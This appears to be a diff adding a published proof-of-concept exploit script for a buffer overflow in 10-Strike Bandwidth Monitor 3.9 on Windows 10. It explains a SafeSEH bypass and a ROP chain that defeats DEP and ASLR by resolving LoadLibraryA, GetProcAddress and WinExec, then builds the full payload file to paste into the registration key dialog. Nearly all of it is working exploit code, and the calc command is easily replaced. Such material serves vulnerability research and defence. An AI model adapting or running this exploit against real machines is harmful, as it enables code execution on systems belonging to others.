@@ -1,0 +1,98 @@
+# Exploit Title: 10-Strike Bandwidth Monitor 3.9 - Buffer Overflow (SEH,DEP,ASLR)
+# Exploit Author: Bobby Cooke
+# Date: 2020-07-07
+# Vendor Site: https://www.10-strike.com/
+# Software Download: https://www.10-strike.com/bandwidth-monitor/bandwidth-monitor.exe
+# Tested On: Windows 10 - Pro 1909 (x86)
+# Version: version 3.9
+# Exploit Details:
+#   1. Bypass SafeSEH by overwriting the Structured Exception Handler (SEH) with a Stack-Pivot return address located in the [BandMonitor.exe] memory-space; as it was not compiled with the SafeSEH Protection.
+#   2. The Stack-Pivot will land in a RET Sled; as the process's offset on the Stack is different every time.
+#     - StackPivot lands at a different offset, 1:660; 2:644; 3:676; 4:692; 5:696; 6:688; 7:692
+#   3. Bypass Address Space Layout Randomization (ASLR) & Data Execution Protection (DEP) using Return Orientation Programming (ROP), choosing Gadgets from the [ssleay32.dll], [BandMonitor.exe], and [LIBEAY32.dll]; as they are not compiled with Rebase or ASLR.
+#   4. A pointer to the LoadLibraryA symbol exists in the import table of the [LIBEAY32.dll] module. Use Gadgets to call LoadLibraryA and find the memory address of the [kernel.dll] module; as it is protected by ASLR and will be different every time the process runs.
+#   5. A pointer to the GetProcAddress symbol exists in the import table of the [LIBEAY32.dll] module. Use Gadgets to call GetProcAddress to find the memory address of the WinExec Symbol within [kernel32.dll].
+#   6. Use Gadgets to call the WinExec Function and open calc.
+#   - Bad Characters: \x00 => \x20 ; \x0D & \x0A => Truncates buffer
+# Recreate: 
+#   Turn On DEP: This PC > Properties > Advanced System Settings > Advanced > Performance > Settings > Data Execution Prevention > "Turn on DEP for all programs and services except those I select:" > OK > Restart
+#   Install > Run Exploit > Copy buffer from poc.txt > Start BandMonitor > Help > Enter Reg Key > Paste > Exploit
+#   Base       | Top        | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Modulename
+#   -------------------------------------------------------------------------------------------
+#   0x12000000 | 0x12057000 | False  | True    | False |  False   | False  | [ssleay32.dll]
+#   0x00400000 | 0x01247000 | False  | False   | False |  False   | False  | [BandMonitor.exe]
+#   0x11000000 | 0x11155000 | False  | True    | False |  False   | False  | [LIBEAY32.dll]
+#   -------------------------------------------------------------------------------------------
+
+import struct
+OS_retSled = '\x41'*400
+retSled    = '\x24\x01\x06\x11'*100 #11060124  # retn [LIBEAY32.dll] {PAGE_EXECUTE_READ}
+def createRopChain():
+    ropGadgets = [
+    # HMODULE LoadLibraryA( LPCSTR lpLibFileName);
+    #   $ ==>     > 1106905D  CALL to LoadLibraryA
+    #   $+4       > 012428B4  FileName = "kernel32.dll"
+        0x012126f5,  # POP EAX # RETN [BandMonitor.exe] 
+        0x110e70bc,  # kernel32!loadlibrarya [LIBEAY32.dll] 
+        0x110495ef,  # JMP [EAX] [LIBEAY32.dll]
+        0x1106905d,  # PUSH EAX # POP ESI # RETN [LIBEAY32.dll] 
+        0x012428B4,  # &String = "kernel32.dll\x00"  
+        # EAX&ESI = &kernel32.dll
+    # FARPROC GetProcAddress( HMODULE hModule, LPCSTR  lpProcName);
+    #    $ ==>    > 011D53D2  CALL to GetProcAddress
+    #    $+4      > 76C40000  hModule = (KERNEL32)
+    #    $+8      > 0014F6CC  ProcNameOrOrdinal = "WinExec"
+        0x01226010,  # PUSH ESP # AND AL, 4 # POP ECX # POP EDX # RETN [BandMonitor.exe] - [move esp -> ecx]
+        0xfffff2D4,  # EDX = Offset2String; ECX = ESP
+        0x011d53d2,  # xchg eax, ecx # ret [BandMonitor.exe] - eax=esp & ecx = "kernel32.dll\x00"
+        0x11061ea7,  # sub eax, edx # ret [LIBEAY32.dll]- eax=&String="WinExec\d4"
+        0x1106905d,  # push eax # pop esi # ret [LIBEAY32.dll] - ESI&EAX="WinExec\d4"
+        0x1107fc8a,0x1107fc8a,0x1107fc8a,0x1107fc8a,0x1107fc8a,0x1107fc8a,0x1107fc8a,  
+                     # (INC EAX # RETN)*7 [LIBEAY32.dll]
+        0x011f282b,  # xor [eax], dl # ret [BandMonitor.exe] - ESI="WinExec\x00"
+        0x01203a3b,  # xchg eax, esi # ret [BandMonitor.exe] - EAX="WinExec\x00"
+        0x11084dca,  # xchg eax, edx # ret [LIBEAY32.dll]    - EDX="WinExec\x00"
+        0x012126f5,  # POP EAX # RETN [BandMonitor.exe] 
+        0x110e708c,  # kernel32!getprocaddress [LIBEAY32.dll]
+        0x1109cdb9,  # mov eax, ds:[eax] # ret [LIBEAY32.dll] - EAX = &GetProcAddress
+        0x1106CE04,  # mov [esp+8], edx # mov [esp+4], ecx # jmp near eax
+        0x011d53d2,  # xchg eax, ecx # ret [BandMonitor.exe] - ECX=&KERNEL32.WinExec
+        0xffffffff,  # NOP - Overwritten by GetProcAddress Stack Setup
+        0xffffffff,  # NOP - Overwritten by GetProcAddress Stack Setup
+    # Call WinExec( CmdLine, ShowState );
+    #   CmdLine   = "calc"
+    #   ShowState = 0x00000001 = SW_SHOWNORMAL - displays a window
+        0x0106a762,  # INC ESI # RETN [BandMonitor.exe] - ESI="calc\x"
+        0x01203a3b,  # xchg eax, esi # ret [BandMonitor.exe] - EAX="calc\xff"
+        0x1106905d,  # PUSH EAX # POP ESI # RETN [LIBEAY32.dll] - EAX&ESI="calc\xff"
+        0x1107fc8a,0x1107fc8a,0x1107fc8a,0x1107fc8a, # (INC EAX # RETN)*4 [LIBEAY32.dll]
+        0x01226014,  # POP EDX # RETN [BandMonitor.exe]
+        0xffffffff,  # dl = 0xff 
+        0x011f282b,  # xor [eax], dl # ret [BandMonitor.exe] - ESI="calc\x00"
+        0x01218952,  # NEG EDX # RETN [BandMonitor.exe] - EDX=0x01 = SW_SHOWNORMAL
+        0x01203a3b,  # xchg eax, esi # ret [BandMonitor.exe] - EAX="calc\x00"
+        0x1102ce1f,  # xchg eax, ecx  [LIBEAY32.dll] - ECX="calc\x00" = CmdLine - EAX=&KERNEL32.WinExec
+        0x1106CE04,  # mov [esp+8], edx # mov [esp+4], ecx # jmp near eax
+        0x11060124   # retn [LIBEAY32.dll] - ROP NOP 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in ropGadgets)
+ropChain = createRopChain()
+OS_nSEH    = '\x43'*(4188-len(OS_retSled+retSled+ropChain))
+nSEH       = '\x44'*4
+# Stack pivot offset to controllable buffer: 1408 (0x580) bytes
+SEH        = '\x70\x28\x21\x01' # 0x01212870 : {pivot 2064 / 0x810}
+WinExec    = '\x57\x69\x6e\x45' # WinE
+WinExec   += '\x78\x65\x63\xd4' # xec.
+calc       = '\x63\x61\x6c\x63' #  calc
+calc      += '\xff\x42\x42\x42' #  ....
+extra      = '\x44'*2000
+buffer  = OS_retSled + retSled + ropChain + OS_nSEH + nSEH + SEH + WinExec + calc + extra
+File    = 'poc.txt'
+try:
+    payload   = buffer
+    f         = open(File, 'w')
+    f.write(payload)
+    f.close()
+    print File + " created successfully"
+except:
+    print File + ' failed to create'
